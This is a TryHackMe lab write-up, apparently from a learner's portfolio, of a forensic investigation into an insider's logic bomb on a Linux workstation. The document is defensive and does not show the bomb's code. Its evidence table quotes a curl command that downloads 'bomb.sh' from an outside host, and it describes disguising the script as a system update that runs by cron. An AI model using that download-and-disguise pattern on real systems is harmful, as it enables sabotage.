# 🧨 Logic Bomb Forensics Investigation (TryHackMe)

## 🧭 Objective
Investigate a Linux workstation used by a malicious insider to uncover signs of sabotage, privilege escalation, and a logic bomb designed to execute under specific conditions.

## 🧪 Tools & Techniques Used
- **Command-Line Tools**: `journalctl`, `grep`, `cat`, `curl`, `vi`
- **Linux Forensics**: Log review, file metadata inspection, user auditing
- **Threat Detection**: Insider threat patterns, script analysis
- **Cron Job & Script Forensics**

## 🔍 Key Findings / Evidence
| Action                     | Details                                           |
|---------------------------|---------------------------------------------------|
| 📦 Package Installed      | `/usr/bin/apt install dokuwiki`                  |
| 📁 Working Directory      | `/home/cybert`                                   |
| 👤 Suspicious User        | `it-admin`                                       |
| 🔐 Sudoers Modified       | `Dec 28 06:27:34`                                |
| 📝 Script Created         | `bomb.sh`                                        |
| 🌐 Script Source          | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`|
| 🛠️ Renamed Script         | `/bin/os-update.sh`                              |
| 📄 Triggered File Output  | `goodbye.txt`                                    |
| ⏰ Execution Time         | Scheduled for 08:00 AM (via cron or similar)     |

## 📖 Analysis Summary
- A user named `it-admin` was created with elevated privileges.
- The user downloaded a malicious script and disguised it as a system update.
- The logic bomb was timed to execute silently and create a message file.
- Logs showed the exact timeline of suspicious privilege escalation.

## 🧠 Skills Demonstrated
- Insider threat detection
- Linux privilege escalation forensics
- Cron job and logic bomb analysis
- Timeline reconstruction via system logs

## 🧰 Real-World Application
This mirrors real IR cases involving rogue insiders or misconfigured automation. It shows how seemingly benign user actions can escalate into system-wide compromise.

## 🎓 Lessons Learned
I gained hands-on experience identifying logic bombs and investigating user abuse through log and script analysis. It helped demystify how subtle sabotage can hide in operational scripts.

## ✅ Completion Status
Completed via TryHackMe – Logic Bomb Room
